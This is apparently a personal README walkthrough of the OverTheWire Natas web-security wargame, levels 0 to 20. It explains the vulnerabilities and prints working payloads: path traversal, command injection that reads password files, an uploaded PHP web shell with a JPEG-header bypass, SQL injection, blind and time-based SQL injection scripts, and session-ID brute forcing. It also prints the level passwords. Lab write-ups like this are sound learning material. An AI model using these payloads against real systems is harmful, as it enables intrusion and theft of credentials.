# Natas Wargame

This repository tracks my progress through the Natas wargame by OverTheWire. Natas is focused on web security, covering a wide range of real-world web vulnerabilities including authentication bypasses, information disclosure, input manipulation, client/server-side logic flaws, and basic web exploitation techniques.

Each level is a hosted web page with a challenge that can be solved using tools like browser developer tools, curl, Burp Suite, and basic scripting. I’ll document each level with steps, explanations, and any payloads used. Some levels may be solved with hints or public write-ups, but I’ll always explain the solution in my own words.

## Level 0 → 1
We log in as `Natas0`, and the website says `"You can find the password for the next level on this page."`. We hit `F12` to open the developer tools, and in the `HTML` of the page we can see a `div`, inside it we find the next password.

Password: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

## Level 1 → 2
This time the website says the same thing, but rightclicking is blocked. We do the same as previous level and get the password.

Password: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

## Level 2 → 3
The website says `There is nothing on this page`. But looking at the `HTML`, we notice this tag:
```html
<img src="files/pixel.png">
```
The `img` tag is used to display images, and `src` is the source of the image. We can see that it displays `pixel.png` which is in a directory called `files`. We try to go to the path `/files` in that website, like that:
```
http://natas2.natas.labs.overthewire.org/files/
```
It works and we can see some files, one of them is `users.txt`. Clicking on it shows it's content, which is usernames and their passwords, and one of them is `Natas3`.

Password: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

## Level 3 → 4
We log in, and the website says the same. But this time there's no `img` tag, there is a comment saying
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
This is a hint. In many websites, there is a file called `robots.txt` that tells Google's crawlers what parts of the websites they should crawl. So we visit the path `/robots.txt` and see this:
```
User-agent: *
Disallow: /s3cr3t/
```
It means that all crawlers should avoid the path `/s3cr3t/`. We go into that path, and find a file called `users.txt`, and inside it we find the next password.

Password: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

## Level 4 → 5
We log in and the website says `authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`. We don't have access to `Natas5` yet, so we need to trick the website into thinking that we were referred to this site from the specified address.

### `curl` command
`curl` (Client URL) is a CLI tool for transfering data by communicating web or application servers over popular network protocols, like `HTTP`, `HTTPS`, `FTP` and more. 

An HTTP request has the option to include information about which address referred it to the actual page. The `curl` command allows us to specify a referrer using the `-e` flag. Another useful flag is `-u` that let's us specify username and password for our request. We first use this command on our terminal:
```bash
curl -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```
But the response says `401 Unauthorized`, so we need to add the username and password.
```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```
Now we get access to the website, which gives us the next password.

Password: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

## Level 5 → 6
This time the website says `Access disallowed. You are not logged in`, which is weird because we just logged in.

### HTTP Cookies
`HTTP cookies` are small text file that websites store on the user's browser. They are mainly used by websites to remember information about the user in order to personalize and track activity and preferences. More importantly, they are used for login processes.

In our case, even though we logged in, the website doesn't recognize that we are logged in. To track if a user is logged in, websites use `HTTP cookies`, so that's what we should check. In the developer tools we can see the `storage` tab, and inside we can see the website's cookies. There is one cookie here, and it has a field called `loggedin`, which is set to `0`. We change it to `1` and refresh, and now the website knows we are logged in and the next password is revealed.

Password: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

## Level 6 → 7
This time we need to find a secret input. There is also a link to view the sourcecode, so we check it and we can see that function:
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

### PHP Language
`PHP` (Hypertext Preprocessor) is a scripting language that is very popular for server-side in websites. It allows developers to embed dynamic code within HTML.  When a user visits a PHP-enabled page, the server processes the PHP code and sends the resulting HTML output to the browser. PHP is widely used for creating dynamic websites, handling forms and connecting to databases. It is enclosed in `<?php ... ?>` tags (possible without `php`, like in our example), variables start with `$` and the content of forms sent by `POST` request can be used with the `$_POST` variable.

As we can see by the `<? ... ?>` tags, the above function is written in `PHP`. That's why by viewing the sourcecode in the developer tools, we can't see this function. 

Inside the function, we can see the line `include "includes/secret.inc";`. It means that a file named `includes/secret.inc` exist. We want to check it out, so we go to the path `/includes/secret.inc` and view its source code, and there is a comment with the secret input. We go back and submit the secret code, and we get the next password.

Password: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

## Level 7 → 8
This time there are 2 links on the page, `Home` and `About`. By clicking on Home, it adds `?page=home` to the url and displays a text saying `this is the front page`. It does a similar thing with About.

### Path Traversal Attack
`Path traversal` attack is a security vulnerability of websites that allows the attacker to access files and directories outside the website's file system location. It is done by manipulating input paths on the website. When using unintended paths, like `../` or `/etc/` for example, the attacker can travel inside the directory hierarchy and access sensitive info, such as passwords, system data and configuration files that should be restricted. This can be avoided by validating the file related operations on the server.

When viewing the page's source code, there is a hint comment:
```HTML
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

So we want to use `Path traversal` to see the password on that path. As we've seen, the website uses `?page=` in order to view the content of `home` and `about`, that might be files in the server's directory. So by using the path:
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
We travel to the user's password file and get the next password.

Password: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

## Level 8 → 9
Similar to the previous level, we get a link to the source code and need to find a secret input. By looking at the source code, we can see the following `PHP` function:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
We can see that the secret code has been encoded, and we can see the encoding function. The encoding process uses 3 built-in `PHP` functions:
* `base64_encode` - encode strings with `base64`. 
* `strrev` - reverse a string.
* `bin2hex` - convert a string (`ASCII`) to hex values.

### Base64
`base64` transforms binary data into a sequence of printable characters. It is done by taking 6 bits at a time, and mapping them into one of 64 unique characters. Data being transformed into `base64` is taking about 33% more space in memory. `base64` is used to transfer binary data across channels that only support text content. It is popular for sending email attachments, and also on the web, to embed images and binary assets inside text format files like `HTML` and `CSS`.

So now we have the encoded secret and the encoding process, we want to take the encoded secret and decode it by reversing the encoding process.

```bash
nano decode.php
```
In this file, we write the decoding function:
```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$secret = base64_decode(strrev(hex2bin($encodedSecret)));
print $secret;
?>
```
`hex2bin` does the opposite of `bin2hex`, and `base64_decode` is used to decode data that has been encoded using `bas64_encode`. So we reversed the encoding process and used it on the encoded secret that we found on the website's source code, in order to get the original secret.

```bash
php decode.php
```
We run our decoding program and get the input secret. After submitting it on the website, we get the next password.

Password: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

## Level 9 → 10
This time we have a search input and we once again can view the source code. By viewing it, we see this `PHP` function:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
We can see that if the search key isn't empty, the program uses `passthru()`, which is similar to `exec()`, used to execute scripts and programs on the system. The program uses `grep` in order to find the search keyword in a dictionary. We can manipulate the search input to make `grep` show the next password. 

### Command Injection Attack
A `Command injection` attack occurs when an attacker is able to execute system commands on a server by exploiting insecure user input handling. This typically happens when an application passes user input directly into a system command (with `exec()`, `system()`, shell calls, or like in our example, `passthru()`) without proper validation or sanitization. By injecting a well-crafted input, often using special characters like `;`, `&&`, or `|`, an attacker can run malicious commands on the system, potentially gaining unauthorized access, extracting data, or taking control of the system.

We use this input for the search:
```bash
"" /etc/natas\_webpass/natas10 \
```
The search key is not empty, so The program actually executes this command:
```bash
grep -i "" /etc/natas\_webpass/natas10 \ dictionary.txt
```
`grep -i ""` will accept any line in any file, because they all include `""`, which is an empty input. Then, we make it look inside `/etc/natas_webpass/natas10` instead of the dictionary file. By ending with `\`, we "break a line" and practically avoid searching in the dictionary file. By using this command, we manipulated the website's search input into running an unintended command and giving us the next password.

Password: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

## Level 10 → 11
This is similar to the previous level, but this time the website says `For security reasons, we now filter on certain characters`. We check out the source code and see this function:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The website is tring to protect itself from our last `Command injection` attack by not allowing the input to contain certain special characters. 

### Regular Expression
Regular expressions (regex) are patterns used to match and manipulate text. They are often written between forward slashes (`/.../`) which act as delimiters, marking the beginning and end of the expression. For example, `/cat/` will match the word "cat" in a string. `PHP` provides functions like `preg_match()` and `preg_replace()` to work with regular expressions. Within the pattern, special characters like `.` (any character), `*` (zero or more), or `^` (start of string) allow for powerful and flexible searching.

So by using the regular expression `'/[;|&]/'`, the website don't allow inputs that contain the characters `[;|&]`. The `/` in the expression only marks the beginning and end of the pattern, so in  our case it doesn't bother us, and similar to the previous level, we can use this input to get the next password.

```bash
"" /etc/natas\_webpass/natas11 \
```

Password: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

## Level 11 → 12
As we log in, there is an input field with hex color code, and it can be used to change the website's background color. It also says `Cookies are protected with XOR encryption`. There is also a link to view the source code, and inside we find this `PHP` function:
```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
It means that if we can change the cookie so the field `showpassword` is set to `yes`, the page will show the next password. We also see in the source code another `PHP` code, I will not bring the full code. What happens there is that the server reads the cookie from the user (`$_COOKIE`) and decodes it, so it can know what color it should change the background to, and more importantly, if it should show the password. The data is being decoded in this line:
```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
```
We can use `json_encode()` and `base64_encode()` to reverse the decoding process of `json_decode()` and `base64_decode()`, but we cannot reverse the `xor_encript()`, because inside the function the key is censored.

### XOR Encryption
In `XOR encryption`, each character of the input is combined with a key using the XOR (`^`) operation. If we have both the original input and the encrypted output, we can recover the key because of the reversible nature of XOR:
```php
input_char ^ key = output_char
```
So, rearranging it:
```php
output_char ^ input_char = key
```
By XORing the known input and output, we can reveal the key used for each character.

### URL Encoding
`URL encoding`, also known as `Percent encoding`, converts characters into a format that can be transmitted over the internet. `URL encoding` is used to replace unsafe `ASCII` characters with a `%` followed by 2 hexa digits. For example, web URLs cannot contain spaces, so spaces inside a URL is being replaced with the value `%20`. 

In our case, by looking the `data` in the cookie, we can see that it ends with `%3D`, which is the URL decode for `=`. When working with the data, we need to URL decode it, so we replace the end of the data with `=`.

So, can see the original data being XOR encrypted in the code (`array("showpassword"=>"no", "bgcolor"=>"#ffffff")`) and we have the output of the encryption (the `data` in our cookie), so we can xor them find the encryption key.

```php
<?php
$data = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
$originalData = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
print json_encode($originalData) ^ base64_decode($data);
?>
```
The output of this is `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`, so the key to the encryption is `eDWo`. Now that we know the encryption key, we can craft our own cookie data so that when the server encrypts it, `showpassword` field will be set to `"yes"`.

```php
<?php
$key = "eDWo";
$data = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$xorData = "";
for($i = 0; $i < strlen($data); $i++) {
        $xorData .= $data[$i] ^ $key[$i % strlen($key)];
}
$cookie = base64_encode($xorData);
print $cookie
?>
```
We clone the encryption process of the server, but manipulate the cookie `data` so `showpassword` will be set to `"yes"`. To test it, I first tried it on the original data, when `showpassword` is set to `"no"`, and i got the exact `data` in the cookie, so it works. We set the cookie `data` with the output of this function and refresh, and we got the next password.

Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

## Level 12 → 13
This time the page wants us to upload an `JPEG` image. Looking at the given source code, we can see the `PHP` code for handling the uploaded file. The server gets the file and it's name, generates a random name for the file and saves it in a path that the user can access. What's interesting here is this function:
```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```
`$fn` is the file name given by the user. The server extract the extension of the file and creates the new file on the server with the same extension. It means that if we uploaded a file with `.jpg` extension, the extension of the file that the server creates will also be `.jpg`. But, if we upload a `.php` file, the file on the server also will be a `.php` file, and we will be able to run a `php` code.

```php
<?php
    print passthru("cat /etc/natas\_webpass/natas13");
?>
```
We created a file that runs a `php` code. It executes `cat` on the password file and prints it. But when we upload it from the website, the extension of the file being created is `.jpg`. Looking at the sourcecode again, we can see that line inside the upload form:
```php
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
This line prevents our file from bein `.php`, all files being uploaded will end with `.jpg` because of that value. We need another way to upload the file.

```bash
curl -X POST -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB natas12.natas.labs.overthewire.org/index.php -F "filename=file.php" -F "uploadedfile=@file.php"
```
We use `curl` in order to upload the file, this way we control `"filename"` and not the website form. We use `-X POST` to set the request as `POST` and `-F` flag is used to replicate a form input value, `@` before the file name attaches that file to the request. In the response from the server, we see this line:
```html
The file <a href="upload/w0wsxduq4q.php">upload/w0wsxduq4q.php</a> has been uploaded
```
So the file successfully uploaded to the server with the `.php` extension as we wanted. When we visit the path `upload/w0wsxduq4q.php` the malicious code inside the file is executed and the password is printed.

Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

## Level 13 → 14
Similar to the last level, we need to upload an image to the website. This time it says: ` For security reasons, we now only accept image files!`, and looking at the sourcecode we can see that it is done by using `exif_imagetype()`. This function is a built-in `PHP` function that checks the header of it's input file and returns if it is an image file (and what type) or not.
```php
<?php
    print passthru("cat /etc/natas\_webpass/natas14");
?>
```
We create the file `file.php` similar to the previous level, but this file's header is not an image type. We need to create a new file to trick `exif_imagetype()`.

### File Signature
A `file signature` (AKA `magic numbers`) is a sequence of 2-bytes in the beggining of file, the header. It is used to identify the file type, so the systems knows how to handle them and also extra guarentee that the file is actually the type it is declared. For example, `zip` files start with the sequence `'\x50\x4B\x03\x04'` and `JPEG` files start with `'\xFF\xD8\xFF\xE0'`. For more magic numbers, visit [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

```bash
(echo -ne '\xFF\xD8\xFF\xE0'; cat file.php) > image.php
curl -X POST -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC natas13.natas.labs.overthewire.org/index.php -F"filename=image.php" -F "uploadedfile=@image.php"
```
By using this command we first put the `magic number` of a `JPEG` file inside our new file, and then put the rest of the malicious `PHP` code from `file.php` inside. `exif_imagetype()` checks for the file's signature, so by putting the signature of `JPEG` files we can trick it. Then we send our `POST` request, similar to previous level, and get this in the response:
```html
The file <a href="upload/al6r6jmwih.php">upload/al6r6jmwih.php</a> has been uploaded
```
And by checking the `/upload/al6r6jmwih.php` path we find the next password.

Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

## Level 14 → 15
As we log in, the website asks for username and password (aside from the initial login to `Natas14`). Looking at the given sourcecode, we can see an `SQL query`.

### SQL Injection
`SQL Injection` is a type of security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It happens when user input is improperly filtered or escaped, allowing attackers to inject malicious SQL code. This can lead to unauthorized access to data, bypassing authentication, or even full control over the database. For example, if a web application directly includes user input in an `SQL` query without validation, an attacker might be able to manipulate the query to return all users’ data or delete tables.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
...
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored><br>";
```
These parts of the code are important to us. First, we can see the query the server sends to the database, getting all of the users that have the input user and also the user password. Then, it checks if there's at least 1 `line` that was found in the query, and if there is, the login proccess is complete and the password is given. Therefore, if want to manipulate the query to have at least 1 line.

This time it is a simple `SQL` injection. We insert the following input in the `username` field:
```bash
" or "1"="1" -- 
```
By submitting, the server gets our input and doesn't "sanitize" (check) it, so `$query` becomes this:
```php
$query = "SELECT * from users where username="" or "1"="1" -- " and password=\"".$_REQUEST["password"]."\"";
```
So, the query gets all the line where `username=""`, which is probably none, or `"1"="1"`, which is always true. Because it's a `or`, all lines return true to that condition and included in `$query`. Everything after the `--` is now a "comment" and doesnt matter. So all lines from `users` table get selected by `$query`, then we have at least one line and the login is successful.

Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

## Level 15 → 16
There is one input for username, and the page checks if it exists. After trying some inputs, we get that the username `natas16` exists. Now we want to find it's password, but the only response we get from the server is either the user exists or it doesn't, so a simple `SQL Injection` will not work here, as we don't get the query response. 

### Blind SQL Injection
A `blind SQL injection` happens when a web application is vulnerable to SQL injection, but the results of the injected query are not directly visible in the page’s response. Instead of seeing data, the attacker must infer information based on how the application behaves, such as different page content, error messages, redirects, or response times. For example, an attacker might send a query that causes a delay only if a condition is true (like `...AND IF(password LIKE 'a%', SLEEP(5), 0)`), and measure the response time to deduce the password char by char. This makes `blind SQL injection` slower and more difficult, but still powerful for extracting sensitive data.

The database table has `username` and `password` fields for each user. We will find `Natas16`'s password char by char by using some `SQL` features:
* `LIKE` - that operator lets us search a field not by static value, but with a template. It compares char by char instead of full strings.
* `%` - When using `LIKE`, `%` acts like a "wild card", for example `%a` fits all values ending with an 'a'.
* `BINARY` - that operator lets us compare by binary value, important for case sensitivity.

We can see the query in the page source code:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
Notice that the value comes from `$_REQUEST`, which can be either `GET`, `POST` or a cookie. We want to use injection to make it look like this:
```sql
SELECT * from users where username="natas16" and password LIKE BINARY "<prefix>%"
```
This way, we can brute force over the optional chars, adding everytime a char to the prefix. If we added a char and it's a currect prefix, the server will respond that this user exists. Then we add it to the prefix and try to guess the next char, until we have all 32 chars of the password. As explained, this is a type of `blind SQL injection`.

```bash
#!/bin/bash
url="http://natas15.natas.labs.overthewire.org"
credentials="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
prefix=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while [ ${#prefix} -lt 32 ]; do
	for char in $(echo $chars | fold -w1); do
		pref="${prefix}${char}";

		response=$(curl -s -u $credentials "$url?username=natas16\"+and+password+LIKE+BINARY+\"$pref%");

		if echo "$response" | grep -q "exists"; then
			prefix=$pref
			echo "Current: $prefix"
			break
		fi
	done
done
echo $prefix
```
We run this code and get the next password.

Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

## Level 16 → 17
Similar to [level 9](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-9--10), we have an input and the website searches it inside `dictionary.txt` using `grep`. But this time, the input is being checked, not allowing certain symbols (```[;|&`\'"]```), and also being placed inside quotes (`"<input>"`) so getting the password is harder. Since `"` is banned by the server we need to use another technique, and luckily `$()` are not banned.

Similar to the previous level, we will try to get the password char by char by using `blind SQL injection`. We can use `$()` to execute commands inside the `grep` parameter, and it's output will be the search input. For example, if we use `$(whoami)`, the search input will be `natas17`. In our case, we will use another `grep`, and it's output will be the input of the server's `grep`.

First, we will test an input that the password cannot contain.
```bash
$(grep $$$ /etc/natas_webpass/natas17)
```
The website returns everything inside `dictionary.exe`, and this is because the output of that command is empty, so every line returns true for the server's `grep`. Next, we will try some legitimate chars that can appear inside the password file.
```bash
$(grep a /etc/natas_webpass/natas17)
$(grep b /etc/natas_webpass/natas17)
```
The first input `a` gives a response similar to `$$$`, so there is no `a` in the password. on the other hand, `b` gives an empty response, so we know that there is a `b` in the password.

```bash
#!/bin/bash
url="http://natas16.natas.labs.overthewire.org"
credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
passChars=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for char in $(echo $chars | fold -w1); do
	response=$(curl -s -u $credentials "$url?needle=\$(grep+$char+/etc/natas_webpass/natas17)&submit=Search");

	if ! echo "$response" | grep -q "April"; then
		passChars=$passChars$char
	fi
done
echo $passChars
```
We go over all the options and we find that the password only contain these chars `bhjkoqsvwCEFHJLNOT05789`, but we do not know the order. We will do something similar to the previous level.
```bash
#!/bin/bash
url="http://natas16.natas.labs.overthewire.org"
credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
pass=""
chars="bhjkoqsvwCEFHJLNOT05789"

while true; do
	counter=0
	for char in $(echo $chars | fold -w1); do
		response=$(curl -s -u $credentials "$url?needle=\$(grep+$pass$char+/etc/natas_webpass/natas17)&submit=Search");

		if ! echo "$response" | grep -q "April"; then
			pass=$pass$char
			echo "found $char"
			counter=35
		fi
		((counter++))
	done
	if [ $counter -eq ${#chars} ]; then
		break
	fi
done
echo $pass
```
This time, we start with `b` and then try to append each char after it. If the sequence `b<char>` is not a part of the password we will get the dictionary content, otherwise it is part of the password and we can add it and try another char. So at the end, we will have `b<rest of the password>`, which is the right part of the password where `b` is the separator.

We get the output `bo7LFNb8vwhHb9s75hokh5TF0OC`. Now to find the left part, we will do the same but trying to add each char to the left of this output. I will not bring that code as it is very similar, but at the end we get the full password.

Password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

## Level 17 → 18
This level is exactly the same as [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but this time the responses from the server are in a comment, so we do not get any feedback at all. We need to use a more complicated type of `blind SQL injection`, where our only response from the server is timing (how long it takes to get a resonse). We first want to find the target username. 

### Burp Suite
`Burp Suite` (or just `Burp`) is a powerful web vulnerability testing tool used by security professionals and ethical hackers to find and exploit weaknesses in web applications. It acts as an intercepting proxy between your browser and the target application, allowing you to inspect, modify, and replay `HTTP/S` requests and responses. `Burp Suite` includes various tools such as `Repeater` for manual testing, `Intruder` for automated attacks like brute-force or fuzzing, and `Scanner` (in the Pro version) for automated vulnerability detection. It's especially popular for tasks like testing login forms, detecting SQL injection, XSS, and other web-based exploits.

Assuming the target user is `natas18`, I intercepted a request and used the `Repeater` on `Burp` with the following input in a `POST` request body.
```sql
username=natas18" AND SLEEP(5) #
```
`Burp` automatically used `URL encoding` on that input. What happens here is only if `natas18` exists, then the query will try the right part of the `AND` and will execute `SLEEP(5)`. And indeed, by using this input the response from the server takes more than 5 seconds, while on other usernames it takes less than 1.

Now we know the username and that `time-based blind SQL injection` can be done in this case. To reveal the password, we will use the same technique as in [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but with response time and not response content.

```bash
#!/bin/bash
url="http://natas17.natas.labs.overthewire.org"
credentials="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
prefix=""
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while [ ${#prefix} -lt 32 ]; do
	for char in $(echo $chars | fold -w1); do
		pref="${prefix}${char}";
		start=$(date +%s)

		response=$(curl -X POST -s -u $credentials -d "username=natas18\"+AND+IF(password+LIKE+BINARY+'$pref%', SLEEP(4),0) OR username=\" #" $url);
		
		if [ $(($(date +%s) - $start)) -ge 4 ]; then
			prefix=$pref
			echo "Current: $prefix"
		fi
	done
done
echo $prefix
```
We inject this value:
```sql
username=natas18" AND IF(password LIKE BINARY '$pref%', SLEEP(4),0) OR username=" #
```
`OR username="` is used to "close" the quotes that the server used. We check the response time from the server, and if it is greater that 4 seconds then we got a match, and we move to the next char.

Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

## Level 18 → 19
The website asks for an admin user login in order to give the next password. Looking at the source code, we can see that the website using a `PHP session` to login.

### PHP Session Hijacking Attack
A `PHP session hijacking attack` occurs when an attacker steals a victim's session ID (usually stored in a cookie) and uses it to impersonate the victim on a web application. Since PHP uses session IDs to identify logged-in users, obtaining a valid session ID lets the attacker bypass authentication without needing a password. This can happen through insecure cookie handling, XSS (cross-site scripting), or sniffing network traffic over unencrypted connections. Once the attacker sets the stolen session ID in their browser or HTTP requests, they gain access to the victim’s account as if they were legitimately logged in.

We can see in the source code that the `PHP session ID` is just a number between 1 and 640. So we can brute force over all the session IDs and hopefully one of them is an active session of an admin.
```bash
#!/bin/bash
url="http://natas18.natas.labs.overthewire.org"
credentials="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

for i in {1..640}; do
	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$i" $url);
	
	echo "$i: $(echo $response | grep "Password")"
done
```
We start scanning the `PHP session` IDs from 1, and by the 119th ID we get an admin access and the username (`natas19`) and password are revealed.

Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

## Level 19 → 20
This level is similar to the previous level, but session IDs are not sequental. We need to understand how the session IDs are given, so we first get our own by sending `username` as `admin` with a random password. We get the ID `3132382d61646d696e`, which looks like a hex value. We should get more values to try and find a pattern.
```
3332322d61646d696e
3332362d61646d696e
3231332d61646d696e
```
We can see a clear pattern, where the first 3 bytes are between 30 and 39 and the rest is `2d646667`. If we decode it as `URL encoding`, we find out the pattern; It contains random 3 digits, then a separator `-` and then the username. for example, `3132382d61646d696e` is `128-admin`. In the previous level we found the admin username, which was `natas19`, and the max ID was 640. As this level is similar, we can suggest that the username is `natas20` and brute force the random digits.

```bash
#!/bin/bash
url="http://natas19.natas.labs.overthewire.org"
credentials="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

for i in {1..640}; do
	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$(echo -n "$i" | od -An -tx1 | tr -d ' \n')2d61646d696e" $url);

	if ! echo "$response" | grep -q "regular"; then
		echo "$i$j$k: $response"
	fi
done
```
Explaining this line ```bash (echo -n "$i" | od -An -tx1 | tr -d ' \n') ```:
* ```bash echo -n "$i" ``` - prints the number, `-n` prevents a new line.
* ```bash od -An -tx1 ``` -  dumps the input as hex bytes, `-An` removes the address.
* ```bash tr -d ' \n' ``` - removes spaces and new line.

Using that script with `username=natas20` didn't work, so i changed it to `admin`. It worked, the right combination was `281-admin`, which is `3238312d61646d696e` encoded. We can see that using `URL encoding` is as safe (or not safe) as using plain text.